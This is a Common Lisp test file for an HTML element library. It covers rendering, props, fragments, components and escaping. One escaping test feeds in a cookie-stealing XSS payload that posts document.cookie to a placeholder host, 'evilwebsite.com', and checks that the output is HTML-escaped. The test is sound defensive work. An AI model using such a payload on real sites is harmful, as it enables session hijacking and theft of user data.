(defpackage #:hsx-test/element
  (:use #:cl
        #:rove
        #:hsx/element)
  (:import-from #:named-readtables
                #:in-readtable)
  (:import-from #:mstrings
                #:mstring-syntax))
(in-package #:hsx-test/element)

(in-readtable mstring-syntax)

(deftest tag-test
  (testing "element-class"
    (ok (typep (create-element :div nil nil) 'tag))
    (ok (typep (create-element :html nil nil) 'html-tag))
    (ok (typep (create-element :img nil nil) 'self-closing-tag))
    (ok (typep (create-element :style nil nil) 'non-escaping-tag))
    (ok (typep (create-element :<> nil nil) 'fragment))
    (ok (typep (create-element (lambda ()) nil nil) 'component))
    (ok (signals (create-element "div" nil nil))))

  (testing "flatten-children"
    (let* ((elm (create-element :p
                                nil
                                (list "a"
                                      nil
                                      (list "b" (list nil "c"))
                                      (cons "d" "e")))))
      (ok (equal (list "a" "b" "c" "d" "e") (element-children elm)))))
  
  (testing "empty-element"
    (ok (string= "<div></div>"
                 (render-to-string (create-element :div nil nil)))))
  
  (testing "element-with-props"
    (ok (string= "<div prop1=\"value1\" prop2></div>"
                 (render-to-string (create-element :div
                                                   (list :prop1 "value1"
                                                         :prop2 t
                                                         :prop3 nil)
                                                   nil)))))
  
  (testing "element-with-children"
    (ok (string= "<p>foo</p>"
                 (render-to-string (create-element :p
                                                   nil
                                                   (list "foo"))
                                   :pretty t)))
    (ok (string= #M"<p>
                 \  <span>foo</span>
                  </p>"
                 (render-to-string (create-element :p
                                                   nil
                                                   (list (create-element :span
                                                                         nil
                                                                         (list "foo"))))
                                   :pretty t)))
    (ok (string= #M"<p>
                 \  foo
                 \  <span>bar</span>
                  </p>"
                 (render-to-string (create-element :p
                                                   nil
                                                   (list "foo"
                                                         (create-element :span
                                                                         nil
                                                                         (list "bar"))))
                                   :pretty t))))

  (testing "element-with-props-and-children"
    (ok (string= "<p prop1=\"value1\" prop2>foo</p>"
                 (render-to-string (create-element :p
                                                   (list :prop1 "value1"
                                                         :prop2 t
                                                         :prop3 nil)
                                                   (list "foo"))
                                   :pretty t)))
    (ok (string= #M"<p prop1=\"value1\" prop2>
                 \  foo
                 \  <span>bar</span>
                  </p>"
                 (render-to-string  (create-element :p
                                                    (list :prop1 "value1"
                                                          :prop2 t
                                                          :prop3 nil)
                                                    (list "foo"
                                                          (create-element :span
                                                                          nil
                                                                          "bar")))
                                    :pretty t))))

  (testing "self-closing-tag"
    (ok (string= "<img src=\"/background.png\">"
                 (render-to-string (create-element :img
                                                   (list :src "/background.png")
                                                   nil)
                                   :pretty t))))
  
  (testing "escaping-tag"
    (ok (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
                 (render-to-string
                  (create-element :div
                                  nil
                                  (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))))))
  
  (testing "non-escaping-tag"
    (ok (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
                 (render-to-string
                  (create-element :script
                                  nil
                                  "alert('<< Do not embed user-generated contents here! >>')")))))
  
  (testing "fragment"
    (let ((frg (create-element :<>
                               nil
                               (list (create-element :li
                                                     nil
                                                     (list "bar"))
                                     (create-element :li
                                                     nil
                                                     (list "baz"))))))
      (ok (string= #M"<li>bar</li>
                    <li>baz</li>"
                   (render-to-string frg :pretty t)))
      (ok (string= #M"<ul>
                   \  <li>foo</li>
                   \  <li>bar</li>
                   \  <li>baz</li>
                   \  <li>brah</li>
                    </ul>"
                   (render-to-string (create-element :ul
                                                     nil
                                                     (list (create-element :li
                                                                           nil
                                                                           (list "foo"))
                                                           frg
                                                           (create-element :li
                                                                           nil
                                                                           (list "brah"))))
                                     :pretty t)))))

  (testing "minify-props-text"
    (let ((elm (create-element :div
                               '(:x-data "{
                                    open: false,
                                    get isOpen() { return this.open },
                                    toggle() { this.open = ! this.open },
                                }")
                               nil)))
      (ok (string= (render-to-string elm)
                   "<div x-data=\"{ open: false, get isOpen() { return this.open }, toggle() { this.open = ! this.open }, }\"></div>")))))

(defun comp1 (&key prop children)
  (create-element :div
                  nil
                  (list prop
                        children)))

(defun comp2 (&rest props)
  (create-element :div
                  nil
                  (list (getf props :prop)
                        (getf props :children))))

(defun comp3 (&rest props &key prop children &allow-other-keys)
  (create-element :div
                  nil
                  (list prop
                        children
                        (getf props :other-key))))

(deftest component-test
  (testing "component-accepting-keyword-args"
    (let ((elm (expand-component (create-element #'comp1
                                                 '(:prop "value")
                                                 (list "child")))))
      (ok (eq :div (element-type elm)))
      (ok (equal (list "value" "child") (element-children elm)))))
  
  (testing "component-accepting-property-list"
    (let ((elm (expand-component (create-element #'comp2
                                                 '(:prop "value")
                                                 (list "child")))))
      (ok (eq :div (element-type elm)))
      (ok (equal (list "value" "child") (element-children elm)))))
  
  (testing "component-accepting-keyword-args-and-property-list"
    (let ((elm (expand-component (create-element #'comp3
                                                 '(:prop "value" :other-key "other")
                                                 (list "child")))))
      (ok (eq :div (element-type elm)))
      (ok (equal (list "value" "child" "other") (element-children elm))))))
